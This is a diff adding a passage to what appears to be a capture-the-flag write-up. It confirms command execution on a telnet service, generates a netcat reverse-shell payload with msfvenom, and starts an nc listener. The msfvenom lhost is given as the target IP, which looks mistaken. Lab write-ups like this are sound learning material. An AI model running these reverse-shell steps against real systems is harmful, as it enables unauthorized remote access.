@@ -173,8 +173,34 @@ telnet <target-IP> 8012
 
 Now, I resort to checking to see if what I was typing was being executed as a system command by starting a tcpdump listener on my machine.
 
+
 **Command used:**
 ```bash
 sudo tcpdump ip proto \\icmp -i ens5
 ```
+
+After startimg that tcpdump listener, on a separate terminal I used the command "**ping [local THM IP] -c 1**" through the tenet session to see if we're able to execute system commands, and as per the screenshot below, now we are able to execute system commands and reach our local machine.
+
+![Screenshot (69)](https://github.com/user-attachments/assets/138d4513-8b76-48f5-aa5e-21254e17f707)
+
+Now I am going to generate a reverse shell payload using **msvenom** . This will generate and encode a netcat reverse shell for us.
+
+**Command used:**
+```bash
+msfvenom -p cmd/unix/reverse_netcat lhost=<target-IP> lport=4444 R
+```
+
+**Findings:**
+1. The generated payload starts with mkfifo. We are nearly there...
+
+![Screenshot (70)](https://github.com/user-attachments/assets/25dca7d9-438d-4cc2-b284-e4c5c5bf2cb0)
+
+Now all we need to do is start a netcat listener on our local machine. We do this using the command below:
+
+```bash
+nc -lvnp 4444
+```
+
+
+
 
